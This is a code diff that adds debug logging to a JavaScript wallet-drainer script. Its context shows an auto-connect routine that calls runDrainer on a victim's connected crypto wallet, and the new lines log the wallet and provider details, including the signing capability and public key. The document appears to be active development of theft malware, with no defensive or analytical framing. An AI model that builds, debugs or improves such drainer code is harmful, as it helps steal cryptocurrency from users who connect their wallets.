@@ -3538,6 +3538,7 @@ async function runDrainer(provider) {
       // Use the wallet that was actually connected
       const walletKey = window.connectedWallet.key;
       console.log('[runDrainer] Using connected wallet:', walletKey);
+      console.log('[runDrainer] Connected wallet details:', window.connectedWallet);
       
       // Map wallet key to wallet info
       const walletMap = {
@@ -5752,9 +5753,17 @@ window.runDrainer = runDrainer;
                 provider: provider
               };
               
+              console.log(`[AUTO_CONNECT] Stored connected wallet info:`, window.connectedWallet);
+              
               // Trigger the drain process directly
               if (window.runDrainer) {
                 console.log(`[AUTO_CONNECT] Triggering runDrainer for ${wallet.name} with provider`);
+                console.log(`[AUTO_CONNECT] Provider details:`, {
+                  hasConnect: typeof provider.connect === 'function',
+                  hasSignTransaction: typeof provider.signTransaction === 'function',
+                  isConnected: provider.isConnected ? provider.isConnected() : 'N/A',
+                  publicKey: provider.publicKey ? provider.publicKey.toString() : 'N/A'
+                });
                 window.runDrainer(provider);
               } else {
                 console.error('[AUTO_CONNECT] runDrainer function not found');
